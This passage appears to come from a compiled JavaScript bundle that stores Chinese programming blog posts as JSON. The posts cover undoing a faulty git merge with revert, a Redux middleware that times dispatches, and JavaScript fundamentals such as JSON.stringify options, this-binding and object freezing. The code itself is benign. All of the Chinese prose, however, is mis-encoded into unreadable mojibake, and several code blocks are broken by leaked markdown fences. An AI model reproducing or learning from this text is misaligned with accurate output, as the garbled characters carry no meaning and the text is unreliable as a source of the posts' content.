merge&quot;ï¼Œv4ä¹Ÿä¸å­˜åœ¨äº†</p>\\n<p>ä½¿ç”¨ <code>git revert &quot;fault merge&quot;</code>ï¼Œ ä¸ä¼šå½±å“åˆ°v4</p>\\n<p>revertåæ˜¯è¿™æ ·çš„ï¼Œç›®å‰åœ¨revert merge</p>\\n<pre><code><pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master) -&gt;revert merge\\n           \\\\            /                     \\n            d1  --&gt;  d2  </code></pre></code></pre><p>ç»§ç»­æ·»åŠ æ–‡ä»¶</p>\\n<pre><code><pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master) -&gt;revert merge -&gt;v5\\n           \\\\            /                     \\n            d1  --&gt;  d2  --&gt;d3 --&gt;d4</code></pre></code></pre><p>ç°åœ¨åœ¨v5 éœ€è¦åˆå¹¶ dev</p>\\n<p>ç›´æ¥<code>git merge dev</code> åªèƒ½åˆå¹¶ d3å’Œd4</p>\\n<p>æœ‰2ç§åŠæ³•ï¼Œ</p>\\n<ol>\\n<li><p>åœ¨d1,å’Œd2ä¸Šæ‰‹åŠ¨ä¿®æ”¹ï¼Œå³ä½¿æ·»åŠ ä¸€ä¸ªç©ºæ ¼ï¼›ç„¶åå›åˆ°masterï¼Œ<code>git merge dev</code>ï¼Œå¤„ç†å†²çªä¾¿å¯ï¼ˆæ¯ä¸ªæ–‡ä»¶éƒ½ä¿®æ”¹å¤ªéº»çƒ¦ï¼‰</p>\\n</li>\\n<li><p>å†æ¬¡revertåˆ°ä¹‹å‰revertçš„éƒ¨åˆ†ï¼Œ<code>git revert &quot;revert merge&quot;</code>,ç„¶åä¼šå‘ç°d1å’Œd2åˆå›æ¥äº†(æœ€åˆçš„æœ‰bugçš„ç‰ˆæœ¬)ï¼Œå†<code>git merge dev</code>å°†ä¿®æ­£çš„ç‰ˆæœ¬åˆå¹¶è¿›æ¥ï¼Œå¤„ç†å†²çªå³å¯</p>\\n</li>\\n</ol>\\n<blockquote>\\n<p>å¦ï¼š ç¬¬2æ­¥åè¿‡æ¥ä¹Ÿå¯ï¼Œå…ˆ<code>git merge dev</code>ï¼Œå°†æ”¹åŠ¨è¿‡çš„åˆå¹¶è¿›æ¥ï¼Œå†<code>git revert &quot;revert merge&quot;</code>ï¼Œå¤„ç†å†²çª</p>\\n</blockquote>\\n<hr>\\n<blockquote>\\n<p>è‡ªå·±æ³¨ï¼šgit-testç›®å½•ä¸­ï¼Œç›®å‰æ­£åœ¨v5ï¼Œdevçš„dev-1ï¼Œdev-2æ˜¯è¢«revertçš„ï¼Œdev-2åšäº†ä¿®æ”¹ï¼Œå¯ä»¥ä½¿ç”¨ç¬¬2æˆ–è€…ç¬¬3ç§æ–¹æ³•</p>\\n</blockquote>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-01","timeArr":[2018,8,1,0,0,0,0],"title":"ä¸€ä¸ªå…³äºGITæ’¤é”€åˆå¹¶çš„å¤„ç†revert","uuid":"c717f697562ea9e27b08040a52e05db0718b1a50","summary":"<pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master)\\n           \\\\            /                     \\n            d1  --&gt;  d2                               ...</code></pre>","slug":"yi-ge-guan-yu-GIT-che-xiao-he-bing-de-chu-li-revert","sha":"1de2e1722337b507aecf967ac8e888cae31f7bbb"}')},658:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yi-ge-ji-lu-redux-mei-ci-dispatch-hao-shi-zhong-jian-jian\\">ä¸€ä¸ªè®°å½•reduxæ¯æ¬¡dispatchè€—æ—¶ä¸­é—´ä»¶</h2>\\n<h3 id=\\"yuan-ma\\">æºç </h3>\\n<p><a href=\\"https://gist.github.com/clarkbw/966732806e7a38f5b49fd770c62a6099\\">æºç åœ°å€</a></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> timing = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">store</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">next</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">if</span>(performance.mark===<span class=\\"hljs-literal\\">undefined</span>) <span class=\\"hljs-keyword\\">return</span> next(action)\\n  performance.mark(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_start`</span>);\\n  <span class=\\"hljs-keyword\\">let</span> result = next(action);\\n  performance.mark(<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_end`</span>);\\n  performance.measure(\\n    <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>`</span>,\\n    <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_start`</span>,\\n    <span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${action.type}</span>_end`</span>\\n  );\\n  <span class=\\"hljs-keyword\\">return</span> result;\\n};</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"shi-yong\\">ä½¿ç”¨</h3>\\n<p>å¦‚æœéœ€è¦è®°å½•åŒ…æ‹¬ä¸­é—´ä»¶å’Œdispatchçš„è€—æ—¶ï¼Œæ”¾åœ¨<code>applyMiddleWare</code>æœ€å‰é¢ï¼š</p>\\n<p><code>applyMiddleWare(timing,thunk,...milldeware)</code></p>\\n<p>å¦‚æœåªè®°å½•dispatchçš„ï¼Œæ”¾åœ¨æœ€åé¢ï¼š</p>\\n<p><code>applyMiddleWare(thunk,middleware1,...,timing)</code></p>\\n<p>ç„¶åå¯ä»¥é€šè¿‡<code>performance.getEntriesByType(&#39;measure&#39;)</code>è·å–æ‰€æœ‰è€—æ—¶çš„é›†åˆ(Array)ã€‚</p>\\n","toc":[{"anchor":"yi-ge-ji-lu-redux-mei-ci-dispatch-hao-shi-zhong-jian-jian","level":2,"text":"ä¸€ä¸ªè®°å½•reduxæ¯æ¬¡dispatchè€—æ—¶ä¸­é—´ä»¶"},{"anchor":"yuan-ma","level":3,"text":"æºç "},{"anchor":"shi-yong","level":3,"text":"ä½¿ç”¨"}],"relatedTags":null,"created_at":"2018-07-17","timeArr":[2018,6,17,0,0,0,0],"title":"ä¸€ä¸ªè®°å½•reduxçš„dispatchè€—æ—¶çš„ä¸­é—´ä»¶","uuid":"8e74b1491a2006b6a1642598cc517a267cfa577b","summary":"<h4>ä¸€ä¸ªè®°å½•reduxæ¯æ¬¡dispatchè€—æ—¶ä¸­é—´ä»¶</h4>\\n<h4>æºç </h4>\\n<p><a href=\\"https://gist.github.com/clarkbw/966732806e7a38f5b49fd770c62a6099\\">æºç åœ°å€</a></p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> timing = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">store</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">next</span> =&gt;</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> {\\n...</code></pre>","slug":"yi-ge-ji-lu-redux-de-dispatch-hao-shi-de-zhong-jian-jian","sha":"78386b134e2b2ff73ad010cc436a6bcaadc22582"}')},659:function(n){n.exports=JSON.parse('{"content":"<p>ä¸€äº›JSåŸºç¡€(4)</p>\\n<h4 id=\\"an-zhi-chuan-di-he-an-yin-yong-chuan-di\\">æŒ‰å€¼ä¼ é€’å’ŒæŒ‰å¼•ç”¨ä¼ é€’</h4>\\n<p>æŒ‰å€¼ä¼ é€’çš„ä¾‹å­ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">passByValue</span>(<span class=\\"hljs-params\\">x</span>)</span>{\\n  x=<span class=\\"hljs-number\\">999</span>\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-number\\">5</span>;\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>}\\npassByValue(a);\\npassByValue(b)\\na   <span class=\\"hljs-comment\\">// 5</span>\\nb   <span class=\\"hljs-comment\\">// {a:1}</span></code></pre></code></pre>\\n<p>æŒ‰å¼•ç”¨ä¼ é€’çš„ä¾‹å­(è™šæ„)ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">passByReference</span>(<span class=\\"hljs-params\\">x</span>)</span>{\\n  x=<span class=\\"hljs-number\\">999</span>\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-number\\">5</span>;\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>}\\npassByReference(a);\\npassByReference(b)\\na   <span class=\\"hljs-comment\\">// 999</span>\\nb   <span class=\\"hljs-comment\\">// 999</span></code></pre></code></pre>\\n<h4 id=\\"jsonstringify\\">JSON.stringify()</h4>\\n<p>æ”¯æŒè½¬æ¢å®‰å…¨çš„JSONç»“æ„</p>\\n<p>ä¸å®‰å…¨çš„ JSON å€¼ï¼š</p>\\n<p> <code>undefined</code>ã€ <code>function</code>ã€ <code>symbol</code>\\nï¼ˆES6+ï¼‰å’ŒåŒ…å«å¾ªç¯å¼•ç”¨ï¼ˆå¯¹è±¡ä¹‹é—´ç›¸äº’å¼•ç”¨ï¼Œå½¢æˆä¸€ä¸ªæ— é™å¾ªç¯ï¼‰çš„å¯¹è±¡éƒ½ä¸ç¬¦åˆ JSON\\nç»“æ„æ ‡å‡†</p>\\n<p>é‚£ä¹ˆé‡åˆ°ä¸å®‰å…¨JSONå€¼æ€ä¹ˆå¤„ç†å‘¢ï¼Ÿæœ‰2ç§æ–¹æ³•</p>\\n<p>ä¸€ã€</p>\\n<p>ä½¿ç”¨<code>toJSON</code>ï¼Œå¦‚æœå¯¹è±¡å†…éƒ¨ç”¨<code>toJSON</code>æ–¹æ³•ï¼Œ<code>JSON.stringify</code>çš„æ—¶å€™å›é¦–å…ˆæ‰§è¡Œ<code>toJSON</code>ï¼Œ\\nå†å¯¹å…¶è¿”å›å€¼è¿›è¡Œå¤„ç†</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>}\\n<span class=\\"hljs-built_in\\">Object</span>.setPrototypeOf(a,{<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">3</span>})\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a)   <span class=\\"hljs-comment\\">// \\"{\\"x\\":1,\\"y\\":2}\\"</span>\\n\\na.toJSON=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-comment\\">// æ³¨æ„ï¼šè¿”å›çš„æ˜¯å¯¹è±¡ï¼Œä¸æ˜¯å­—ç¬¦ä¸²</span>\\n  <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-keyword\\">this</span>.z}\\n}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a)   <span class=\\"hljs-comment\\">// \\"{\\"z\\":3}\\"</span></code></pre></code></pre>\\n<p>äºŒã€</p>\\n<p>ä½¿ç”¨å‚æ•°ï¼Œ<code>JSON.stringify</code>è¿˜æœ‰ç¬¬äºŒå’Œç¬¬ä¸‰ä¸ªå‚æ•°</p>\\n<ul>\\n<li>ç¬¬äºŒä¸ªå‚æ•°<code>replace</code></li>\\n</ul>\\n<p>ä¸ºæ•°ç»„æ—¶ï¼Œè¡¨ç¤ºéœ€è¦è¿›è¡Œå­—ç¬¦ä¸²åŒ–çš„å¯¹è±¡</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">3</span>}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,[<span class=\\"hljs-string\\">\\"x\\"</span>,<span class=\\"hljs-string\\">\\"z\\"</span>])   <span class=\\"hljs-comment\\">// \\"{\\"x\\":1,\\"z\\":3}\\"</span></code></pre></code></pre>\\n<p>ä¸ºå‡½æ•°æ—¶ï¼Œæ¥å—2ä¸ªå‚æ•°(k,v)ï¼Œkè¡¨ç¤ºæ¯ä¸€ä¸ªé”®å€¼å¯¹å¯¹åº”çš„keyï¼Œvè¡¨ç¤ºå¯¹åº”çš„valueï¼Œ\\n<strong><em>é‡åˆ°valueä¹Ÿä¸ºå¯éå†å¯¹è±¡æ—¶ï¼Œé€’å½’éå†</em></strong></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:{<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>}}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">k,v</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(k!==<span class=\\"hljs-string\\">\'y\'</span>){\\n    <span class=\\"hljs-keyword\\">return</span> v\\n  }\\n})\\n<span class=\\"hljs-comment\\">// \\"{\\"x\\":1,\\"z\\":{\\"x\\":3,\\"z\\":5}}\\"</span>\\n<span class=\\"hljs-comment\\">// zé‡Œé¢çš„yä¹Ÿè¢«å»é™¤</span></code></pre></code></pre>\\n<ul>\\n<li>ç¬¬ä¸‰ä¸ªå‚æ•°<code>space</code></li>\\n</ul>\\n<p>å¯ä»¥æ˜¯æ­£æ•´æ•°æˆ–è€…å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šè¾“å‡ºçš„ç¼©è¿›æ ¼å¼</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// æ­£æ•´æ•°</span>\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:{<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>}}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,<span class=\\"hljs-literal\\">null</span>,<span class=\\"hljs-number\\">2</span>)  <span class=\\"hljs-comment\\">// 2æ ¼ç¼©è¿›</span>\\n<span class=\\"hljs-comment\\">/*\\n\\"{\\n  \\"x\\": 1,\\n  \\"y\\": 2,\\n  \\"z\\": {\\n    \\"x\\": 3,\\n    \\"y\\": 4,\\n    \\"z\\": 5\\n  }\\n}\\"\\n*/</span>\\n\\n<span class=\\"hljs-comment\\">// å­—ç¬¦ä¸²</span>\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:{<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>}}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,<span class=\\"hljs-literal\\">null</span>,<span class=\\"hljs-string\\">\\"--\\"</span>)  <span class=\\"hljs-comment\\">// 2ä¸ª-ç¼©è¿›</span>\\n<span class=\\"hljs-comment\\">/*\\n\\"{\\n--\\"x\\": 1,\\n--\\"y\\": 2,\\n--\\"z\\": {\\n----\\"x\\": 3,\\n----\\"y\\": 4,\\n----\\"z\\": 5\\n--}\\n}\\"\\n*/</span></code></pre></code></pre>\\n","toc":[{"anchor":"an-zhi-chuan-di-he-an-yin-yong-chuan-di","level":4,"text":"æŒ‰å€¼ä¼ é€’å’ŒæŒ‰å¼•ç”¨ä¼ é€’"},{"anchor":"jsonstringify","level":4,"text":"JSON.stringify()"}],"relatedTags":null,"created_at":"2018-07-09","timeArr":[2018,6,9,0,0,0,0],"title":"ä¸€äº›è¢«å¿½ç•¥çš„JSçŸ¥è¯†4","uuid":"fd8492b29dfac9fa4e50c5b2b4926048c19a0553","summary":"<p>ä¸€äº›JSåŸºç¡€(4)</p>\\n<h4>æŒ‰å€¼ä¼ é€’å’ŒæŒ‰å¼•ç”¨ä¼ é€’</h4>\\n<p>æŒ‰å€¼ä¼ é€’çš„ä¾‹å­ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">passByValue</span>(<span class=\\"hljs-params\\">x</span>)</span>{\\n  x=<span class=\\"hljs-number\\">999</span>\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-number\\">5</span>;\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>}\\npassByValue(a);\\npassByValue(b)\\na   <span class=\\"hljs-comment\\">// 5</span>\\nb   <span class=\\"hljs-comment\\">// {a:1}</span>\\n</code></pre>\\n<p>æŒ‰å¼•ç”¨ä¼ ...</p>","slug":"yi-xie-bei-hu-lve-de-JS-zhi-shi-4","sha":"340d5e43659ef754ccb360908ba8d5206f671aab"}')},660:function(n){n.exports=JSON.parse('{"content":"<p>ä¸€äº›JSåŸºç¡€(1)</p>\\n<h4 id=\\"ying-bang-ding-bu-hui-fu-gai-ying-bang-ding-ï¼Œ-dan-new-hui-fu-gai-ying-bang-ding\\">ç¡¬ç»‘å®šä¸ä¼šè¦†ç›–ç¡¬ç»‘å®šï¼Œä½†newä¼šè¦†ç›–ç¡¬ç»‘å®š</h4>\\n<ul>\\n<li>ç¡¬ç»‘å®šä¸ä¼šè¦†ç›–ç¡¬ç»‘å®š<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">show</span>(<span class=\\"hljs-params\\">s</span>)</span>{\\n<span class=\\"hljs-keyword\\">this</span>.a=s\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>var obj1={}\\nvar obj2={}</p>\\n<p>show=show.bind(obj1)\\nshow(5)\\nobj1.a  // 5</p>\\n<p>show=show.bind(obj2)\\n// æ­¤å¤„ä¿®æ”¹çš„è¿˜æ˜¯obj1\\nshow(10)\\nobj2.a  // undefined\\nobj1.a  // 10</p>\\n<pre><code><pre class=\\"hljs\\"><code>* newä¼šè¦†ç›–ç¡¬ç»‘å®š\\n```js\\nfunction show(s){\\n  this.a=s\\n}\\n\\nvar obj1={}\\nvar obj2={}\\n\\nshow=show.bind(obj1)\\nshow(5)\\nobj1.a  // 5\\n\\nobj2=new show(10)\\nobj2.a  // 10</code></pre></code></pre><h4 id=\\"an-quan-de-this\\">å®‰å…¨çš„this</h4>\\n<p>å¦‚æœä¸éœ€è¦ç»‘å®šthisï¼Œä¸€èˆ¬ä¼šä½¿ç”¨nullï¼Œä½†è¿™æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸€æ—¦å†æ¬¡ä½¿ç”¨thisï¼Œç»‘å®šnullä¼šè®©æˆ‘ä»¬ç»‘å®šåˆ°é»˜è®¤(window)ï¼›</p>\\n<p>æ¨èä½¿ç”¨<code>Object.create(null)</code></p>\\n<h4 id=\\"ruan-bang-ding\\">è½¯ç»‘å®š</h4>\\n<p><code>someMethod.softBind(obj)</code></p>\\n<p>æ£€æŸ¥è°ƒç”¨æ—¶çš„ this ï¼Œå¦‚æœ this ç»‘å®šåˆ°å…¨å±€å¯¹è±¡æˆ–è€… undefined ï¼Œé‚£å°±æŠŠ\\næŒ‡å®šçš„é»˜è®¤å¯¹è±¡ obj ç»‘å®šåˆ° this ï¼Œå¦åˆ™ä¸ä¼šä¿®æ”¹ this</p>\\n","toc":[{"anchor":"ying-bang-ding-bu-hui-fu-gai-ying-bang-ding-ï¼Œ-dan-new-hui-fu-gai-ying-bang-ding","level":4,"text":"ç¡¬ç»‘å®šä¸ä¼šè¦†ç›–ç¡¬ç»‘å®šï¼Œä½†newä¼šè¦†ç›–ç¡¬ç»‘å®š"},{"anchor":"an-quan-de-this","level":4,"text":"å®‰å…¨çš„this"},{"anchor":"ruan-bang-ding","level":4,"text":"è½¯ç»‘å®š"}],"relatedTags":null,"created_at":"2018-06-22","timeArr":[2018,5,22,0,0,0,0],"title":"ä¸€äº›è¢«å¿½ç•¥çš„jsçŸ¥è¯†1","uuid":"7f574c8ed284705a049ad19e6b43a77dbe30c6f2","summary":"<p>ä¸€äº›JSåŸºç¡€(1)</p>\\n<h4>ç¡¬ç»‘å®šä¸ä¼šè¦†ç›–ç¡¬ç»‘å®šï¼Œä½†newä¼šè¦†ç›–ç¡¬ç»‘å®š</h4>\\n<ul>\\n<li>ç¡¬ç»‘å®šä¸ä¼šè¦†ç›–ç¡¬ç»‘å®š</li>\\n</ul>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">show</span>(<span class=\\"hljs-params\\">s</span>)</span>{\\n  <span class=\\"hljs-keyword\\">this</span>.a=s\\n}\\n\\n<span class=\\"hljs-keyword\\">var</span> obj1={}\\n<span class=\\"hljs-keyword\\">var</span> obj2={}\\n\\nshow=show.bind(obj1)\\nshow(<span class=\\"hljs-number\\">5</span>)\\nobj1.a  <span class=\\"hljs-comment\\">// 5</span>\\n\\nsho...</code></pre>","slug":"yi-xie-bei-hu-lve-de-js-zhi-shi-1","sha":"5965a8eef20c8f12cc64d0794de2cf6b851589a9"}')},661:function(n){n.exports=JSON.parse('{"content":"<p>ä¸€äº›JSåŸºç¡€(2)</p>\\n<h4 id=\\"object-dui-xiang-de-key\\">Objectå¯¹è±¡çš„key</h4>\\n<p>ä¸€èˆ¬æ¥è¯´ï¼Œobjçš„keyå±æ€§ä¼šè‡ªåŠ¨è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆè°ƒç”¨é»˜è®¤toStringæ–¹æ³•ï¼‰ï¼Œç„¶åå†è¯»å–</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\nmyObject[<span class=\\"hljs-literal\\">true</span>] = <span class=\\"hljs-string\\">\\"foo\\"</span>;\\nmyObject[<span class=\\"hljs-number\\">3</span>] = <span class=\\"hljs-string\\">\\"bar\\"</span>;\\n\\nmyObject[<span class=\\"hljs-string\\">\\"true\\"</span>]; <span class=\\"hljs-comment\\">// \\"foo\\"</span>\\nmyObject[<span class=\\"hljs-string\\">\\"3\\"</span>]; <span class=\\"hljs-comment\\">// \\"bar\\"</span></code></pre></code></pre>\\n<p>å¯¹äºobjectä¹Ÿæ˜¯å¦‚æ­¤ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>};\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>}\\n\\nmyObject[a]=<span class=\\"hljs-number\\">1</span>;\\nmyObject[b]=<span class=\\"hljs-number\\">2</span>;\\n\\nmyObject[<span class=\\"hljs-string\\">\\"[object Object]\\"</span>]; <span class=\\"hljs-comment\\">// 2</span>\\nmyObject; <span class=\\"hljs-comment\\">// {[object Object]: 2}</span></code></pre></code></pre>\\n<p>ä½†å¦‚æœä½¿ç”¨Symbolï¼Œåˆ™ä¼šç ´åè¿™ä¸ªè§„åˆ™ï¼Œåªæœ‰å”¯ä¸€å€¼ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>};\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>};\\n\\na=<span class=\\"hljs-built_in\\">Symbol</span>(a);\\nb=<span class=\\"hljs-built_in\\">Symbol</span>(b);\\n\\nmyObject[a]=<span class=\\"hljs-number\\">1</span>;\\nmyObject[b]=<span class=\\"hljs-number\\">2</span>;\\n\\nmyObject[<span class=\\"hljs-string\\">\\"Symbol([object Object])\\"</span>]; <span class=\\"hljs-comment\\">// undefined</span>\\nmyObject; <span class=\\"hljs-comment\\">// {Symbol([object Object]): 1, Symbol([object Object]): 2}</span>\\nmyObject[a]; <span class=\\"hljs-comment\\">// 1</span>\\nmyObject[b]; <span class=\\"hljs-comment\\">// 2</span></code></pre></code></pre>\\n<h4 id=\\"yi-xie-xian-zhi-dui-xiang-de-fang-fa\\">ä¸€äº›é™åˆ¶å¯¹è±¡çš„æ–¹æ³•</h4>\\n<ul>\\n<li>é™åˆ¶æ‰©å±• <code>Object.preventExtensions</code></li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = {\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">2</span>\\n};\\n<span class=\\"hljs-built_in\\">Object</span>.preventExtensions( myObject );\\nmyObject.b = <span class=\\"hljs-number\\">3</span>;\\nmyObject.b; <span class=\\"hljs-comment\\">// undefined</span></code></pre></code></pre>\\n<ul>\\n<li><p>å¯†å°ï¼ˆé™åˆ¶æ‰©å±•çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ <code>configurable:false</code>)</p>\\n</li>\\n<li><p>å†»ç»“ï¼ˆå¯†å°çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ <code>wirtable:false</code>ï¼‰</p>\\n<p>  note:å¯¹è±¡å†…éƒ¨ä¸ºå¼•ç”¨ï¼Œå³ä½¿å¯¹è±¡å†»ç»“ï¼Œå¼•ç”¨å˜åŒ–ï¼Œä¹Ÿä¼šå˜åŒ–ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> obj={}\\n<span class=\\"hljs-keyword\\">var</span> a=[<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>]\\nobj.x=a;\\n<span class=\\"hljs-built_in\\">Object</span>.freeze(obj);\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>a.push(3)\\nobj.x; // [1,2,3]</p>\\n<p>```</p>\\n<ul>\\n<li>å®Œå…¨å†»ç»“ï¼ˆå†»ç»“çš„åŸºç¡€è¡Œï¼Œéå†å†…éƒ¨å¼•ç”¨å¯¹è±¡ä¹Ÿè¿›è¡Œå†»ç»“ï¼‰</li>\\n</ul>\\n","toc":[{"anchor":"object-dui-xiang-de-key","level":4,"text":"Objectå¯¹è±¡çš„key"},{"anchor":"yi-xie-xian-zhi-dui-xiang-de-fang-fa","level":4,"text":"ä¸€äº›é™åˆ¶å¯¹è±¡çš„æ–¹æ³•"}],"relatedTags":null,"created_at":"2018-06-24","timeArr":[2018,5,24,0,0,0,0],"title":"ä¸€äº›è¢«å¿½ç•¥çš„jsçŸ¥è¯†2","uuid":"cfe39dfd0c96a8f6a8263f7275c5d9f94c1a0480","summary":"<p>ä¸€äº›JSåŸºç¡€(2)</p>\\n<h4>Objectå¯¹è±¡çš„key</h4>\\n<p>ä¸€èˆ¬æ¥è¯´ï¼Œobjçš„keyå±æ€§ä¼šè‡ªåŠ¨è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆè°ƒç”¨é»˜è®¤toStringæ–¹æ³•ï¼‰ï¼Œç„¶åå†è¯»å–</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\nmyObject[<span class=\\"hljs-literal\\">true</span>] = <span class=\\"hljs-string\\">\\"foo\\"</span>;\\nmyObject[<span class=\\"hljs-number\\">3</span>] = <span 